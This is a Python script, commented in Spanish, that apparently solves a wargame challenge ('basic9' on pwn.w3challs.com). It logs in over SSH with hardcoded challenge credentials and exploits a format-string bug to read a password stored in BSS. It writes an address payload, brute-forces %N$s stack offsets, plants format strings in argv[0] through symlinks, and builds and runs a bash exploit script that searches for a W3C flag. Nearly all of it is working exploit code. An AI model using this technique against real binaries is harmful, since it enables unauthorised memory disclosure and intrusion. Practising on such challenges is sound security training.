#!/usr/bin/env python3

import pexpect
import struct

print("🔥💀🔥 ÚLTIMO INTENTO - LEYENDO BSS DIRECTAMENTE 🔥💀🔥")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

print("\n[*] El password está en 0x0804a060 (BSS)")
print("[*] Necesitamos leer de esa dirección usando format string")

# Ir a /tmp
child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# La técnica correcta:
# 1. Poner la dirección 0x0804a060 en el stack
# 2. Usar %s para leer desde esa dirección

PASSWORD_ADDR = 0x0804a060

print(f"\n[*] Creando payload con dirección 0x{PASSWORD_ADDR:08x}...")

# Crear un archivo con la dirección en little endian
addr_bytes = struct.pack("<I", PASSWORD_ADDR)

# Convertir a string hex para echo
hex_str = ''.join([f'\\\\x{b:02x}' for b in addr_bytes])

# Crear archivo con la dirección
cmd = f'echo -ne "{hex_str}" > payload'.encode()
child.sendline(cmd)
child.expect([b'\\$'])

# Ahora necesitamos encontrar dónde está esta dirección en el stack
print("\n[*] Buscando la dirección en el stack...")

# Primero, veamos qué hay en el stack
child.sendline(b'(cat payload; echo "AAAA") | /home/basic9/basic9 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" 2>&1')
child.expect([b'\\$'], timeout=5)
output = child.before

try:
    output_str = output.decode('utf-8', errors='ignore')
    print(f"Stack dump: {output_str}")
except:
    pass

# Ahora probar diferentes posiciones para %s
print("\n[*] Probando diferentes posiciones para leer desde la dirección...")

for i in range(1, 20):
    print(f"  Posición {i}...")
    
    # Usar la dirección como input y leer con %s en posición i
    cmd = f'(cat payload; echo "AAAA") | /home/basic9/basic9 "%{i}$s" 2>&1 | strings'.encode()
    child.sendline(cmd)
    
    try:
        index = child.expect([b'\\$', b'W3C', b'Segmentation'], timeout=2)
        
        if index == 1:  # W3C encontrado!
            output = child.before + child.after
            print(f"\n🔥🔥🔥 FLAG ENCONTRADA 🔥🔥🔥")
            
            try:
                output_str = output.decode('utf-8', errors='ignore')
            except:
                output_str = output.decode('latin-1', errors='ignore')
            
            import re
            match = re.search(r'W3C\{[^}]+\}', output_str)
            if match:
                print(f"\nFLAG: {match.group(0)}\n")
                break
    except:
        pass

# Método alternativo: el programa usa argv[0] no stdin
print("\n[*] Usando argv[0] en lugar de stdin...")

# Necesitamos que argv[0] contenga la dirección Y el format string
# Esto es más complejo pero posible

# Crear un script que haga el trabajo
exploit_code = f'''
#!/bin/bash
# Dirección de password: 0x{PASSWORD_ADDR:08x}

# Crear un symlink con la dirección embebida
addr=$(echo -ne "\\x{PASSWORD_ADDR & 0xff:02x}\\x{(PASSWORD_ADDR >> 8) & 0xff:02x}\\x{(PASSWORD_ADDR >> 16) & 0xff:02x}\\x{(PASSWORD_ADDR >> 24) & 0xff:02x}")

# Probar diferentes offsets
for i in {{1..20}}; do
    # El symlink debe contener la dirección y luego %s
    name="${{addr}}%${{i}}\\$s"
    
    # Crear symlink
    ln -sf /home/basic9/basic9 "$name" 2>/dev/null
    
    # Ejecutar
    ./"$name" dummy 2>&1 | strings | grep W3C && echo "[!] Found at offset $i"
done
'''

child.sendline(f'cat > exp.sh << \'EOF\'\n{exploit_code}\nEOF'.encode())
child.expect([b'\\$'])

child.sendline(b'chmod +x exp.sh && bash exp.sh')
child.expect([b'\\$'], timeout=10)

# Último recurso: el programa imprime argv[0] directamente
# Si argv[0] = "%134$s", imprimirá lo que esté en la posición 134 del stack
print("\n[*] Último intento - posición 134 (basado en output anterior)...")

child.sendline(b'ln -sf /home/basic9/basic9 "%134$s"')
child.expect([b'\\$'])

child.sendline(b'./"%134$s" dummy 2>&1')
child.expect([b'\\$'], timeout=5)
output = child.before

try:
    output_str = output.decode('utf-8', errors='ignore')
    
    # Buscar W3C en el output
    if 'W3C' in output_str:
        print(f"\n🔥 ENCONTRADO EN POSICIÓN 134 🔥")
        
        import re
        match = re.search(r'W3C\{[^}]+\}', output_str)
        if match:
            print(f"\nFLAG: {match.group(0)}\n")
except:
    # Si falla UTF-8, intentar con bytes raw
    if b'W3C' in output:
        print(f"\n🔥 FLAG ENCONTRADA (bytes raw) 🔥")
        # Extraer manualmente
        start = output.find(b'W3C')
        end = output.find(b'}', start)
        if end != -1:
            flag = output[start:end+1]
            print(f"\nFLAG: {flag.decode('utf-8', errors='ignore')}\n")

child.close()
print("\n💀 FIN 💀")